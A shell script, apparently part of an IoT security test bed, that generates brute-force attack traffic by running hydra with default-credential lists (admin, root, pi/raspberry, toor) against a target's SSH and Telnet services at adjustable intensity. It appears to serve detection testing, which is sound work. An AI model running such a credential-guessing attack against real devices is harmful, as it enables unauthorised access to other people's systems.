#!/bin/sh
# NEXA test-attack: Brute Force — repeated credential-guessing against the victim's
# SSH and Telnet login services (iot_test lane).
echo "[BRUTEFORCE] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> parallel hydra tasks / pause between sweeps.
case "$INTENSITY" in
    low)    THREADS=2;  SLEEP_MAX=6 ;;
    high)   THREADS=16; SLEEP_MAX=2 ;;
    *)      THREADS=6;  SLEEP_MAX=4 ;;  # medium
esac

cat > /tmp/bf_users.txt << 'EOF'
admin
root
user
pi
device
EOF
cat > /tmp/bf_passwords.txt << 'EOF'
admin
password
1234
root
raspberry
toor
12345
default
EOF

while [ "$(date +%s)" -lt "$END" ]; do
    # Telnet brute force (busybox telnetd on :23)
    hydra -L /tmp/bf_users.txt -P /tmp/bf_passwords.txt \
        -t "$THREADS" -q "$TARGET" telnet 2>/dev/null
    # SSH brute force (dropbear on :22)
    hydra -L /tmp/bf_users.txt -P /tmp/bf_passwords.txt \
        -t "$THREADS" -q "$TARGET" ssh 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[BRUTEFORCE] Done."
